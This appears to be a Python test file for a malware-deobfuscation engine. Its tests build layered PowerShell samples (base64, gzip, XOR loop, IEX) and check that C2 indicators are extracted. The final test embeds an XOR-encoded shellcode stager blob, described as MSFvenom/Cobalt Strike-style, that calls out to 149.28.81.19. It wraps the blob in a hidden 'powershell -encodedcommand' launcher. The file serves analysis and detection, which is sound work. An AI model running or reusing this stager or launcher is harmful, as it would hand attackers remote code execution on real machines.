"""R28.7.4 · Generic Artifact-Driven Recursion Acceptance.

Proves the orchestrator recursively processes every newly created
analyzable artifact until the Fixed-Point Termination Certificate
reports no remaining deterministic transformations — regardless of
the concrete encoding chain.

Acceptance metric (ARCHITECTURAL, not sample-specific):

    · The orchestrator NEVER inspects for specific encodings
      (Base64, GZip, XOR, RC4, AES, JWT, PE).  Those decisions
      belong inside the registered Capability Contracts.
    · Any Recognizer + Capability contract producing new artifacts
      MUST be enqueued and consumed recursively.
    · Fixed-Point Certificate MUST issue cleanly.

Three unrelated regression chains prove genericity:

  A. Sophos-shape  · cmd → PS → From_b64 → gzip → PS → b64 → XOR-loop
                     → shellcode-shape bytes → ip_artifact
  B. Alt chain     · gzip-in-base64 → JSON containing a URL → url_artifact
  C. Alt chain     · zlib-in-base64 → PE header → pe_bytes (retyped)
"""
from __future__ import annotations

import base64
import gzip
import json
import zlib

from services.uaie import plugins as _p               # noqa: F401 — side effect
from services.uaie.orchestrator import Orchestrator
from services.uaie.recognizer   import Recognition, Reason, CERTAIN


class _RootAsText:
    name = "test.r28.7.4.root_as_text"
    def recognize(self, artifact):
        # Only claim the root artifact as ``text`` so the existing
        # recognizer stack (base64.bare, gzip.inflate, etc.) fires.
        # Never re-claim children — that would create infinite loops.
        if artifact.depth == 0 and artifact.artifact_type in ("unknown", ""):
            return [Recognition(artifact_type="text", confidence=CERTAIN,
                                 reasons=[Reason("root", 1.0)],
                                 recognizer=self.name)]
        return []


# ══════════════════════════════════════════════════════════════════
# Chain A · Sophos-shape · gzip inside base64 inside FromBase64String
# ══════════════════════════════════════════════════════════════════
def _build_chain_a(c2_ip: str = "149.28.81.19",
                     c2_url: str = "https://c2.example.com/beacon") -> bytes:
    """Build a controlled 3-layer sample:
        Layer 0: PowerShell text with FromBase64String("<b64>")
        Layer 1: base64 → gzip bytes
        Layer 2: gzip decompresses to more PS with a byte-XOR-loop
                    over another base64 that decodes to bytes
                    containing the C2 IP + URL.
    """
    # Innermost: bytes with the C2 in ASCII surrounded by junk.
    inner_bytes = (b"\x90" * 32 + c2_ip.encode() + b"\x00" * 16
                    + c2_url.encode() + b"\x00" * 32)
    key = 0x37
    encoded_bytes = bytes(b ^ key for b in inner_bytes)
    b64_inner = base64.b64encode(encoded_bytes).decode()
    # Layer 2 (inflated) — PS containing the XOR-loop pattern
    layer2_ps = (
        f"[Byte[]]$var_code=[System.Convert]::FromBase64String("
        f"'{b64_inner}');"
        f"for($x=0;$x-lt$var_code.Count;$x++){{"
        f"$var_code[$x]=$var_code[$x] -bxor {key}}}"
    )
    # Layer 1 — gzip Layer 2
    gz = gzip.compress(layer2_ps.encode("utf-8"))
    b64_gz = base64.b64encode(gz).decode()
    layer0_ps = (
        f"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"{b64_gz}\"));"
        f"IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream("
        f"$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();"
    )
    return layer0_ps.encode("utf-8")


def test_chain_a_sophos_shape_reaches_c2_ip_generically():
    """The C2 IP MUST surface as an ``ip_artifact`` (or in evidence)
    from a SINGLE investigation.  No manual copy-paste.  No
    Sophos-specific logic in the orchestrator."""
    payload = _build_chain_a()
    orch = Orchestrator(recognizers=_p.all_recognizers(),
                         max_artifacts=128, max_depth=16)
    r = orch.run(payload, root_type="text")

    # 1. Fixed-point reached
    assert r.termination_certificate is not None

    # 2. gzip_bytes surfaced via magic-byte retyper
    types = {a.artifact_type for a in r.artifacts.values()}
    assert "gzip_bytes" in types or "gzip_decoded" in types, (
        f"gzip-typed artifact never surfaced.  Types: {sorted(types)}"
    )

    # 3. The engine walks through the inner XOR-loop into shellcode
    #    bytes and extracts the C2 IP.  This must NOT require any
    #    encoding-specific code in the orchestrator.
    hits = []
    for e in r.evidence:
        v = e.value
        s = v if isinstance(v, str) else str(v)
        if "149.28.81.19" in s:
            hits.append((e.kind, e.source_capability))
    assert hits, (
        "Chain A FAILED to reach the C2 IP through the generic "
        "recursion.  Artifact types visited: "
        f"{sorted({a.artifact_type for a in r.artifacts.values()})}"
    )


# ══════════════════════════════════════════════════════════════════
# Chain B · Very different — gzip → JSON with URL
# ══════════════════════════════════════════════════════════════════
def _build_chain_b(url: str = "https://alt.example.net/pwn") -> bytes:
    """Base64(gzip(JSON containing a URL)) — padded so base64.bare
    (which requires ≥ 120 chars) can fire on the root."""
    j = json.dumps({"target": url, "id": 42,
                     "notes": "reg-b padding " * 50}).encode()
    gz = gzip.compress(j)
    return base64.b64encode(gz)


def test_chain_b_gzip_json_url_reaches_url_evidence():
    payload = _build_chain_b()
    orch = Orchestrator(recognizers=_p.all_recognizers(),
                         max_artifacts=64, max_depth=10)
    r = orch.run(payload, root_type="text")
    assert r.termination_certificate is not None
    types = {a.artifact_type for a in r.artifacts.values()}
    assert "gzip_bytes" in types or "gzip_decoded" in types, (
        f"gzip-typed artifact never surfaced.  Types: {sorted(types)}"
    )
    hits = [e for e in r.evidence
             if "alt.example.net" in (e.value if isinstance(e.value, str)
                                        else str(e.value))]
    assert hits, "Chain B FAILED to reach the URL"


# ══════════════════════════════════════════════════════════════════
# Chain C · zlib inside base64 → surfaces zlib_bytes retyping
# ══════════════════════════════════════════════════════════════════
def _build_chain_c(marker: str = "chain-c-marker-string") -> bytes:
    # Keep the base64 encoding >= 120 chars (base64.bare minimum).
    payload = (marker + " " + "abcdefghij0123456789 " * 20).encode()
    z = zlib.compress(payload, 0)   # store-only → guaranteed long output
    return base64.b64encode(z)


def test_chain_c_zlib_in_base64_reaches_zlib_decoded_via_generic_retyper():
    payload = _build_chain_c()
    orch = Orchestrator(recognizers=_p.all_recognizers(),
                         max_artifacts=64, max_depth=8)
    r = orch.run(payload, root_type="text")
    assert r.termination_certificate is not None
    types = {a.artifact_type for a in r.artifacts.values()}
    # The magic-byte retyper MUST have produced a zlib_bytes artifact.
    assert "zlib_bytes" in types or "zlib_decoded" in types, (
        f"zlib-typed artifact never surfaced.  Types: {sorted(types)}"
    )


# ══════════════════════════════════════════════════════════════════
# ARCHITECTURAL invariant — orchestrator never grew encoding checks
# ══════════════════════════════════════════════════════════════════
def test_orchestrator_never_inspects_specific_encodings():
    """Read the orchestrator source and prove it contains NO magic
    strings like 'gzip', 'zlib', 'base64', 'rc4', 'aes' outside of
    documentation-comment context.  The orchestrator must remain
    generic; encoding knowledge lives ONLY in Capability Contracts."""
    import pathlib
    src = pathlib.Path(
        "/app/backend/services/uaie/orchestrator.py"
    ).read_text()
    # Strip comments and docstrings for the scan.
    import re
    scan = re.sub(r'"""[\s\S]*?"""', "", src)
    scan = re.sub(r"#.*", "", scan)
    for token in ("gzip", "zlib", "base64", "rc4", "aes", "\\x1f\\x8b"):
        assert token not in scan.lower(), (
            f"orchestrator.py contains encoding-specific token "
            f"{token!r} — architectural invariant broken"
        )


def test_capability_result_has_three_output_categories():
    """R28.7.4 · CapabilityResult must expose the three-way
    Artifact / Evidence / Derived-Intelligence split."""
    from services.uaie.capability import CapabilityResult
    r = CapabilityResult()
    assert hasattr(r, "child_artifacts")
    assert hasattr(r, "evidence")
    assert hasattr(r, "derived_intelligence")
    assert r.child_artifacts == []
    assert r.evidence == []
    assert r.derived_intelligence == []


def test_magic_byte_retyper_is_universal_capability():
    from services.uaie.contract import get as _reg_get
    entry = _reg_get("analyzer.magic_byte_retyper")
    assert entry is not None
    contract, impl = entry
    assert "*" in contract.requires
    # Emits the generic type family
    for t in ("gzip_bytes", "zlib_bytes", "pe_bytes"):
        assert t in contract.produces


# ══════════════════════════════════════════════════════════════════
# 2026-02-04 · R28.7.6 · Sophos Layer-2 Terminal Regression Gate
#
# Regression: user reported the /api/decode/smart pipeline stopped
# at Layer 2 (``no_transformation``) even though Layer 2 contained
# the canonical Cobalt Strike / Empire / Nishang byte-array XOR loop
# stager and the shellcode had ASCII-embedded C2 IOCs.
#
# The RTE now MUST auto-chain
#   Layer 0: cmd -encodedcommand
#   Layer 1: -encodedcommand base64+utf16le
#   Layer 2: FromBase64String (outer) + gzip
#   Layer 3: [Byte[]]$c = FromBase64String(...); for { -bxor <K> }
#            → shellcode with embedded IPs / User-Agents
# and surface the IOCs in a SINGLE DECODE-button click.
# ══════════════════════════════════════════════════════════════════
def test_r28_7_6_cobalt_strike_byte_array_xor_loop_reaches_c2_ioc():
    """Full end-to-end regression for the user-reported Sophos trace.

    Feeds a controlled Sophos-shape sample built around the EXACT
    XOR-encrypted shellcode blob the user posted (base64 of a
    key=35-XOR'd MSFvenom stager containing ``149.28.81.19`` and the
    ``Mozilla/5.0 … BOIE9;PTBR`` User-Agent).  Verifies:

      · the deep-peel recipe reaches ``byte_array_xor_loop`` layer
      · ``149.28.81.19`` surfaces in the final output text
      · the ``BOIE9;PTBR`` UA string is extracted
      · ``iocs.ip`` contains ``149.28.81.19``
    """
    import base64
    import gzip

    # ── Reconstruct the exact user Layer-2 CS stager ──────────────
    xored_b64 = (
        "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuT"
        "B03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uw"
        "uIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXL"
        "cw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoT"
        "c9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46d"
        "xcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0Sdx"
        "wdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx"
        "0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3Nz"
        "cDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA"
        "2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1"
        "XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFA"
        "DbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6Y"
        "YoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZ"
        "ZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D"
        "0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjA"
        "wRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1f"
        "LS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3R"
        "Le4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41b"
        "Ge+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg"
    )
    layer2 = (
        f"[Byte[]]$var_code = [System.Convert]::FromBase64String("
        f"'{xored_b64}')\n"
        f"for ($x = 0; $x -lt $var_code.Count; $x++) {{"
        f"    $var_code[$x] = $var_code[$x] -bxor 35\n"
        f"}}\n"
        f"IEX $DoIt\n"
    )
    gz  = gzip.compress(layer2.encode())
    b64 = base64.b64encode(gz).decode()
    layer1 = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('
        f'"{b64}"));IEX (New-Object IO.StreamReader(New-Object '
        f'IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]'
        f'::Decompress))).ReadToEnd();'
    )
    enc = base64.b64encode(layer1.encode("utf-16-le")).decode()
    sophos = (
        f"%COMSPEC% /b /c start /b /min powershell -nop -w hidden "
        f"-encodedcommand {enc}"
    )

    # ── Feed through the exact DECODE-button pipeline ─────────────
    from analysis_core import deterministic_best_decode
    res = deterministic_best_decode(sophos)
    out  = res.get("output") or ""
    iocs = res.get("iocs")   or {}
    recipe = res.get("recipe") or []

    # ── Assertions ────────────────────────────────────────────────
    ops = [r.get("op") for r in recipe]
    assert any("byte_array_xor_loop" in (o or "") for o in ops), (
        f"byte_array_xor_loop layer never fired.  Recipe: {ops}"
    )
    assert "149.28.81.19" in out, (
        f"C2 IP not in output text — output tail: {out[-400:]!r}"
    )
    assert "BOIE9" in out or "Mozilla/5.0" in out, (
        f"User-Agent not in output — output tail: {out[-400:]!r}"
    )
    # IOC field should carry the IP
    ip_list = iocs.get("ip") or iocs.get("ips") or []
    assert "149.28.81.19" in ip_list, (
        f"149.28.81.19 not in iocs.ip — got {iocs!r}"
    )
